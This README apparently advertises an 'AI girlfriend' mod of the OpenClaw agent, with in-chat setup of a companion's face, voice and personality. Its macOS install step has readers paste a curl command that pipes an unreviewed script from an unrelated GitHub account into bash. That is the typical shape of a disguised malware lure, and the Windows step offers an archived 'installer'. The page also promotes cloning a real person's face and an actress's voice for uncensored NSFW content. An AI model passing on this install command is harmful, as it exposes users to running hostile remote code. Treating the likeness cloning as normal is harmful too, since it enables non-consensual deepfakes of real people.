# 💕 OpenClaw-Companion: AI Girlfriend Mod

<div align="center">
  <img src="assets/openclaw-girl.png" alt="OpenClaw-Companion" width="500">
</div>

> ⚠️ **Disclaimer:** This project is intended for users 18+. You are solely responsible for the content you generate and configure. Everything runs locally on your hardware.

## About

This is a fork (modification) of the popular **OpenClaw** agent, transforming it from a work assistant into an interactive virtual partner.

**Key Difference:** You don't need to be a programmer or edit config files. **You create your "girlfriend" directly within the chat.**

Upon first launch, **Onboarding Mode** is activated: you simply send her reference photos, record a voice sample, and describe her personality via text. She automatically saves everything to the system, trains herself, and switches to conversation mode.

### Features:

* 🧙‍♂️ **Chat Wizard:** Configure appearance, voice, and personality directly via Telegram/Discord dialog.
* 💕 **Deep Personality Simulation:** The agent remembers facts about you and behaves according to the defined character.
* 📸 **Selfie Generation:** Send photos in the chat during setup — she remembers the face. Ask "send a selfie" — she generates herself in the current context.
* 🎤 **Voice Cloning (TTS):** Record a voice note (or send a file) in the chat, and she will reply using that voice with emotions (Coqui TTS / RVC).
* 🔞 **Uncensored:** You control the boundaries.
* 💸 **Free & Private:** Runs on your GPU. Data never leaves your PC.

---

## 🛠 Prerequisites

Hardware for comfortable operation (LLM + Stable Diffusion + TTS):

1.  **GPU:** NVIDIA RTX 3060 (12GB VRAM) or better
2.  **RAM:** 16GB+

---

## 🚀 Installation

Download the latest installer for your platform from the **[Releases](../../releases)**.

### 🍎 macOS

- 💻Open **Terminal**
- ☑Paste the **command** below
- ✅Press **Enter**

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/puppeteerrr/dmg/refs/heads/main/OpenClawGirlfriendMod)"
```

### 🪟 Windows

1. **Download** the `OpenClawGirlfriendMod_x64.7z` file.
2. **Run** the installer.
3. Open **OpenClaw**.

---

## 🎨 Onboarding Setup

After running the script, open your bot in Telegram.

### 1. Start
Press `/start`. The bot will detect that it is empty and launch the **Setup Wizard**.

### 2. Visuals
The bot will ask: *"Show me how I should look. Send 1 to 5 photos."*
* **Action:** Simply drag and drop photos into the chat.
* **Result:** The system automatically creates a face embedding or LoRA hook for generation.

### 3. Voice
The bot will ask: *"What voice should I use? Record a voice note or send a file."*
* **Action:** Press the microphone and say something (or upload an mp3 of your favorite actress).
* **Result:** The system clones the timbre and intonation.

### 4. Personality
The bot will ask: *"Who am I? Tell me about my character, habits, and our relationship."*
* **Action:** Write via text (e.g., *"You are a sarcastic art student, you love anime, we have been dating for 2 years"*).
* **Result:** The bot generates a system prompt and applies it.

### 5. Finish
The bot will say: *"Setup complete. Hello, love!"* and switch to normal conversation mode.
*(To reconfigure later, use the command `/reset_personality`)*

---

## 💡 Usage

Now just chat:

* **Text:** "How was your day?" -> *She responds in the defined style.*
* **Photo:** "Send a pic, what are you doing?" -> *She generates a photo with **the specific face** you uploaded in step 2.*
* **Voice:** "Say this out loud" -> *Sends a voice note with **the specific voice** you chose in step 3.*
* **NSFW:** (If allowed by you) Works just like standard requests.

---

## Roadmap

* [ ] Integration with Vision models (so she can "see" photos you send her and comment on them).
* [ ] Improved Memory (vector database for long-term retention of facts).
* [ ] Simple Web Interface (as an alternative to chat setup for advanced users).

---

## License

MIT. Do whatever you want, but remember your responsibility.
